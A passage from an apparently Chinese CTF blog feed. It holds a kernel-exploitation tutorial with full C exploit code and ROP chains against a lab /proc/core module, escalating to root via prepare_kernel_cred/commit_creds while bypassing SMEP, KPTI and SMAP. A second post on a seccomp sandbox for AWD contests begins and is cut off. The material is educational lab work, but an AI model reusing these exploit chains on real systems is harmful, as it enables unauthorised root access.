<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">for(i = 0; i &lt; 10; i++)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    rop[i] = canary;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">rop[i++] = (size_t)getPrivilege;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rop[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; ret</span></span><br><span class="line"><span class="comment">rop[i++] = 0;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rop[i++] = 0xffffffff81050ac2 + offset; // iretq; ret; </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rop[i++] = (size_t)spawn_shell;       // rip </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">rop[i++] = user_cs;</span></span><br><span class="line"><span class="comment">rop[i++] = user_rflags;</span></span><br><span class="line"><span class="comment">rop[i++] = user_sp;</span></span><br><span class="line"><span class="comment">rop[i++] = user_ss;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    rop[i] = canary;</span><br><span class="line">&#125;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset;     <span class="comment">//pop rdi; ret</span></span><br><span class="line">rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line"></span><br><span class="line">rop[i++] = <span class="number">0xffffffff81075014</span> + offset;      <span class="comment">// mov cr4, rdi; push rdx; popfq; ret;</span></span><br><span class="line"></span><br><span class="line">rop[i++] = (<span class="type">size_t</span>)getPrivilege;</span><br><span class="line"></span><br><span class="line">rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">rop[i++] = (<span class="type">size_t</span>)spawn_shell;       <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">rop[i++] = user_cs;</span><br><span class="line">rop[i++] = user_rflags;</span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>改前后的cr4寄存器值如下，确实能够成功修改。然后我们回去把init改成用普通用户启动，测试是否能够提权。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301161655713.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301161831159.png"
                      class=""
                >
<p>绕过smep，成功提权。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301170816953.png"
                      class=""
                >
<p>但实际上现代内核中通常会采用“CR4钉住”（CR4 pinning）的机制，使得即使你尝试修改这些位（包括SMAP和SMEP相关位），内核会自动恢复它们的固定状态，从而防止这种简单的修改。所以现在ret2usr这种利用手法已经几乎失效了，一般只能走内核ROP，比如用后述kpti得绕过方法。</p>
<h4 id="kpti保护绕过"><a href="#kpti保护绕过" class="headerlink" title="kpti保护绕过"></a>kpti保护绕过</h4><p>KPTI（Kernel Page-Table Isolation，内核页表隔离）是一种 <strong>安全防御机制</strong>，用于 <strong>防止内核地址泄露</strong>，主要是为了 <strong>缓解 Meltdown 漏洞</strong>（CVE-2017-5754）。</p>
<p>在 <strong>启用 KPTI</strong> 的系统上：</p>
<ul>
<li>用户态运行时，<strong>完全隔离</strong> 内核的页表，防止用户态进程访问或推测出内核地址。</li>
<li>只有在 <strong>发生系统调用（syscall）、中断或异常</strong> 时，才会 <strong>切换到内核页表</strong> 进行内核代码执行。</li>
</ul>
<p>在 <strong>未启用 KPTI</strong> 的情况下，<code>CR3</code> 指向的页表包含 <strong>用户态和内核态的地址映射</strong>。<br><strong>问题</strong>：Meltdown 攻击可以利用 CPU 的 <strong>推测执行漏洞</strong>，从用户态<strong>读取</strong>本应受保护的 <strong>内核地址</strong>！</p>
<p> <strong>KPTI 通过修改 <code>CR3</code> 来隔离页表：</strong></p>
<ul>
<li>用户态执行时：<code>CR3</code> 只加载 <strong>用户页表</strong>（不包含内核页表）。</li>
<li>进入内核态时（如 <code>syscall</code>）：<code>CR3</code> 切换到 <strong>完整页表</strong>（包含用户和内核页表）。</li>
</ul>
<p>KPTI保护机制的绕过主要包括异常处理以及页表切换两种绕过利用手法，到了kpti这种保护时其实我们的ret2usr手法已经不能生效了，需要构建内核ROP并绕过限制，我们还是以上面的题目为例，启动脚本加上<code>kpti=1</code>来启用页表隔离，注意这里cpu参数中用的是kvm64模型（这个模型默认kpti是开启的，这里手动指定方便查看），之前的qemu64-v1会启动不了kpti。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 256M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./mycore.cpio \</span><br><span class="line">-cpu kvm64,+smep \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr kpti=1&quot;</span> \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure></div>
<h5 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h5><p>首先我们来看看如果不用异常处理，而是直接ROP着陆用户态执行用户代码，那么最后会爆<strong>Segmentation fault</strong>。这是因为在 KPTI 启用的情况下，用户态和内核态的 <code>CR3</code> <strong>必须</strong>正确切换，否则CPU <strong>仍然使用内核页表访问用户态地址</strong>，就会崩溃。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301205945326.png"
                      class=""
                >
<p>所以主要思路是捕获<code>Segmentation fault</code>的异常，在异常处理中调用<code>system(/bin/sh)</code>。这种方式能成功地关键在于内核ROP时其实已经成功把当前进程的cred换成了具有root权限的cred。之后靠异常处理就能获得到root权限的shell。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc kpti_bypass.c -static -masm=intel -g -o kpti_bypass</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);            <span class="comment">//打开符号表，获取各符号偏移</span></span><br><span class="line">    <span class="comment">/* FILE* kallsyms_fd = fopen(&quot;./test_kallsyms&quot;, &quot;r&quot;); */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))        <span class="comment">//48条项目一组，一直找commit_creds和prepare_kernel_cred符号的地址</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);                  <span class="comment">//地址在前16个字节</span></span><br><span class="line">            <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);     <span class="comment">//以llx模式解析16个字节，正确解析出地址</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">            </span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]set off to %ld\n&quot;</span>, idx);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]read to buf.&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]copy from user with size: %ld\n&quot;</span>, size);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    signal(SIGSEGV, spawn_shell);</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);         <span class="comment">//以读写模式打开</span></span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="type">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"></span><br><span class="line">    set_off(fd, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    <span class="type">size_t</span> canary = ((<span class="type">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301211900339.png"
                      class=""
                >
<h5 id="页表切换"><a href="#页表切换" class="headerlink" title="页表切换"></a>页表切换</h5><p>借鉴之前改cr4寄存器实现绕过smep的方式，这里我们可以通过操作cr3寄存器实现kpti的绕过。这种方式用的是<strong>swapgs_restore_regs_and_return_to_usermode</strong>函数，这个函数是 <strong>Linux 内核</strong> 在 <strong>从内核态返回用户态</strong> 时使用的一个关键函数，它主要用于 <strong>处理 KPTI（Kernel Page Table Isolation）</strong> 以及 <strong>恢复用户态寄存器</strong>。</p>
<p>该函数的内部存在修改<code>CR3</code>的操作，因此只需要调用该函数，就可以从内核空间的页表修改为用户空间的页表。这里有个小trick，就是能够从该函数偏移0x16处开始执行，因为前面是一排弹栈操作，十分吃ROP空间，而且对后面影响不大。最后注意调用该函数+0x16时，最后还会从栈上弹两个地址，需要我们填充。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301220750057.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301220932948.png"
                      class=""
                >
<p>最后就能成功进入我们的shell中</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301221120036.png"
                      class=""
                >
<p>获取地址偏移方式如下：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/09/ret2usr%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%BB%95%E8%BF%87%E6%B5%85%E6%9E%90/image-20250301213354984.png"
                      class=""
                >
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ROP</span></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    rop[i] = canary;</span><br><span class="line">&#125;</span><br><span class="line">rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line"><span class="comment">// rop[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; ret</span></span><br><span class="line"><span class="comment">// rop[i++] = 0;</span></span><br><span class="line"><span class="comment">// rop[i++] = 0xffffffff81050ac2 + offset; // iretq; ret; </span></span><br><span class="line"></span><br><span class="line">rop[i++] = <span class="number">0xffffffff81a008da</span> + offset + <span class="number">0x16</span>; <span class="comment">// swapgs_restore_regs_and_return_to_usermode</span></span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = <span class="number">0</span>;</span><br><span class="line">rop[i++] = (<span class="type">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">rop[i++] = user_cs;</span><br><span class="line">rop[i++] = user_rflags;</span><br><span class="line">rop[i++] = user_sp;</span><br><span class="line">rop[i++] = user_ss;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h4 id="smap保护绕过"><a href="#smap保护绕过" class="headerlink" title="smap保护绕过"></a>smap保护绕过</h4><p>SMAP，全称 <strong>Supervisor Mode Access Prevention</strong>，是一种硬件安全机制，主要用于防止内核意外或恶意地访问用户空间内存。</p>
<p>此时使用<code>swapgs_restore_regs_and_return_to_usermode</code>函数也是完全可以绕过的，因此可以直接使用它构建<code>ROP</code>链。</p>
<p>若rop长度不够需要栈迁移，则需要更加精巧的手段，我们放到以后学习。</p>
<h4 id="kaslr保护绕过"><a href="#kaslr保护绕过" class="headerlink" title="kaslr保护绕过"></a>kaslr保护绕过</h4><p>与正常pwn题的aslr绕过类似，需要找到漏洞点泄露地址，进而算出基址，与用户态下的利用没有区别。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>kernel</tag>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>self-made sandbox</title>
    <url>/blog/2024/09/21/self-made-sandbox/</url>
    <content><![CDATA[<p>由于最近要打几场awd，一个一个漏洞改过来感觉有点麻烦，所以想到了上沙箱，但是一般好像比赛会禁止上通防，这里想试试看自己通过系统调用写一个沙箱出来，看看能不能瞒天过海。</p>
<h3 id="一、c代码实现沙箱"><a href="#一、c代码实现沙箱" class="headerlink" title="一、c代码实现沙箱"></a>一、c代码实现沙箱</h3><p>不是很清楚沙箱具体用到的系统调用，所以先让gpt生成了一段正常用c语言实现的沙箱代码。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="comment">//gcc -g test.c -o test</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">install_seccomp</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">        <span class="comment">// 读取系统调用号</span></span><br><span class="line">        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, nr)),</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 检查是否为 execve 系统调用（编号 59）</span></span><br><span class="line">        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, <span class="number">59</span>, <span class="number">0</span>, <span class="number">1</span>), </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果是 execve，则杀死进程</span></span><br><span class="line">        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 允许其他系统调用</span></span><br><span class="line">        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW)</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">        .len = <span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(filter[<span class="number">0</span>]),</span><br><span class="line">        .filter = filter</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 启用 seccomp 过滤模式</span></span><br><span class="line">    <span class="keyword">if</span> (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;prctl&quot;</span>);</span><br><span class="line">        _exit(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    install_seccomp();</span><br><span class="line">    <span class="comment">// 你可以在这里运行原来的程序逻辑</span></span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这个 <code>install_seccomp()</code> 函数的作用是通过 <code>seccomp</code>（安全计算模式）设置一个简单的沙箱来限制程序能够调用的系统调用，具体来说，是禁止调用 <code>execve</code> 系统调用。如果程序尝试调用 <code>execve</code>，则会被杀死。其余的系统调用则被允许执行。</p>
<p>以下是其中每个部分的功能和用法的详细解释：</p>
<h4 id="struct-sock-filter-filter"><a href="#struct-sock-filter-filter" class="headerlink" title="struct sock_filter filter[]"></a>struct sock_filter filter[]</h4><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">    BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(<span class="keyword">struct</span> seccomp_data, nr)),</span><br><span class="line">    BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, <span class="number">59</span>, <span class="number">0</span>, <span class="number">1</span>), </span><br><span class="line">    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL),</span><br><span class="line">    BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
